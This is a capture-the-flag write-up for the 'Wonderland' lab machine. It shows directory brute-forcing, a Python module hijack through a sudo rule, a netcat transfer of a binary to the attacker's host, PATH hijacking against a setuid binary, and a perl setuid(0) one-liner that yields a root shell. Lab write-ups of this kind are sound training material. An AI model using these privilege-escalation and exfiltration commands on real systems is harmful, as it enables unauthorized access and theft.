# WRITEUP for Wonderland

## Obtain the flag in user.txt & Escalate your privileges, what is the flag in root.txt?

* After firing up the machine we do a nmap scan and find out http and ssh open, so having a look at we server we can run dirsearch.

* Dirsearch results return /r directory , by intuition we can analyse it further and have a /r/a directory. In this way we find /r/a/b/b/i/t and the source code of this page has ssh creds.

* After logging in using the ssh creds we can scp linpeas to the machine to perform priv - esc.
```
scp /location/linpeas.sh alice@IP:/dev/shm
``` 

Analysing the results of linpeas we find 
```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
this tells us that perl can set uid. We can use this as a priv esc technique. But checking the permissions of perl we see that it is being run by 'hatter' group.
```
ls -l /usr/bin/perl
```
result:- ```-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl```

We can take a look at /etc/sudoer.d/ . From here we find user alice and it contains this info.
```
alice ALL = (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Alice can run this python script as rabbit.

Now we can see that that the script imports 'random' python module, So we can create our own malicious python module and do priv - esc.
So we create a random.py file
```
import os
os.system("/bin/bash")
```   
and then we run this as rabbit
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
```
and now we are user rabbit.
We can travel to /rabbit where we find binary file teaParty.

Now we have to transfer this binary to our attackers machine from wonderland machine, we can do this by using netcat.


### Attacking side 
```
nc -lnvp 9999 > teaParty
``` 
### Victims side
```
nc <Attacker's IP> 9999 < teaParty
```
Now that we have the file we can run strings on it and analyse it.
We see that the binary has setuid that means it can set uid and it has this line.
```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
We can see that it is taking date from the system path, so we can create our own date script and export path to $PATH variable.
so in /rabbit directory we make a bash script named as date
```
#!/bin/bash
/bin/bash -p
```
so we can run this script and export the path to $PATH variable
```
export path=/home/rabbit/:$PATH
```
now when we run teaParty we see that out uid is set as hatter.(out guid is still rabbit).
but now we can see access the hatter directory and cat out the password file and use that password to login as hatter. (```su -l hatter```)
Now we can exploit the perl.

This is a great resource:- https://gtfobins.github.io/gtfobins/perl/

Now that we are perl we can use this command to become root.
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```
Now we are root and we can get both user.txt and root.txt.



